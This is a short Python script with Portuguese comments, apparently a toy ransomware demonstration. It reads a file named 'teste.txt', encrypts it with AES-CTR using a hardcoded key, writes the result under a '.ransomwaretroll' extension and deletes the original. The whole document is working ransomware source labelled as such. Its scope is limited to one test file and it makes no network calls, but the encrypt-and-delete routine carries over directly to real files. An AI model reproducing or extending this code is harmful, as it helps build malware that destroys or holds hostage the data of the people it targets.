import os
import pyaes
import sys
##arquivo que será criptografado
file_name = "teste.txt"

##Key para descriptografia
key = b"testeransomwares"

## --- LÓGICa
try:
    # 1. Verificar se o arquivo existe
    if not os.path.exists(file_name):
        print(f"ERRO: O arquivo '{file_name}' não foi encontrado.")
        sys.exit(1) # Encerra o script

    # 2. Ler os dados do arquivo original
    with open(file_name, "rb") as file:
        file_data = file.read()

    # 3. Criptografar os dados em memória
    print(f"Criptografando o arquivo: {file_name}")
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # 4. Criar o novo arquivo criptografado com a extensão do ransomware
    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, "wb") as new_file:
        new_file.write(crypto_data)
      
    #apos verificação arquvio antigo é removido
    os.remove(file_name)

    print(f"\nSUCESSO! O arquivo '{file_name}' foi criptografado para '{new_file_name}'.")
    print("O arquivo original foi removido.")


except Exception as e:
    # captura exceção de erro e mostra
    print(f"\nOCORREU UM ERRO INESPERADO: {e}")

